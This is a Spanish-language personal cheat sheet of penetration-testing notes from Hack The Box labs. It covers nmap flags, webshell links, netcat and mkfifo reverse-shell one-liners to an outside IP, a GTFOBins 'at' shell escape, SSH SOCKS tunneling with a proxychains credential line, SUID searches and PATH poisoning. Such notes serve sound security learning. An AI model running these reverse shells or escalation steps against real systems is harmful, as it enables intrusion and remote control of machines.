# Aprendiendo de Hackthebox.com

- sitios: 
    - https://brainful.blog/2022/01/19/enumeration-2/

- usando nmap
    - `-sU` scanear puertos UDP
    - `-p80` escanear puerto 80, `-p-` escanear todos los puertos
    - `-sS` tcp syn ping
    - `-v` verbose
    - `-Pn` skip ping

- Reverse shell
    - si se puede subir archivos al sitio se usa un [simple webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985#file-easy-simple-php-webshell-php)
    - [reverse shell cheatsheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).
    - `nc -e /bin/sh 10.0.0.1 1234`
    - si `nc` no soporte la opcion `-e`: 
        - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
    - si se conecta usamos:
        - `python3 -c 'import pty;pty.spawn("/bin/bash")'`

    - si usamos `sudo -l` y no funciona usamos:
        - [GTFObins](https://gtfobins.github.io/gtfobins/at/) `echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null`

    - bajar un archivo con `nc`:
        - en nuestra pc con ip 10.10.14.81: `nc -nvlp 10.10.14.81 4444 > file`
        - en el pc remoto: `nc 10.10.14.81 4444 < file`

- SSH tunneling
    - ssh -D1234 user@10.10.11.136
    - bajamos el `foxyproxy` y configuramos:
        - proxy type: SOCKS5
        - Proxy IP: 127.0.0.1
        - Port: 1234
        - Send DNS through SOCKS5 proxy: enable
    - para aplicaciones de linea de comandos usamos `proxychains`
        - editamos nano /etc/proxychains.conf
        - opcion: strict_chain
        - socks5 127.0.0.1 1234 daniel HotelBabylon23

- [Buscar archivos SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/) (permisos: rws) para usar el path poison:
    - `find / -user root -perm -4000 -print 2>/dev/null`
    - `find / -perm -u=s -type f 2>/dev/null`
    - `find / -user root -perm -4000 -exec ls -ldb {} \;`
    - [path poisoning](https://betterprogramming.pub/becoming-root-via-a-misconfigured-path-720a52981c93) : 
        - `export PATH=/tmp:$PATH`
        - en /tmp suplantamos el nombe de un commando asi cuando
        se llame a ese comando ejecutara el commando en /tmp.

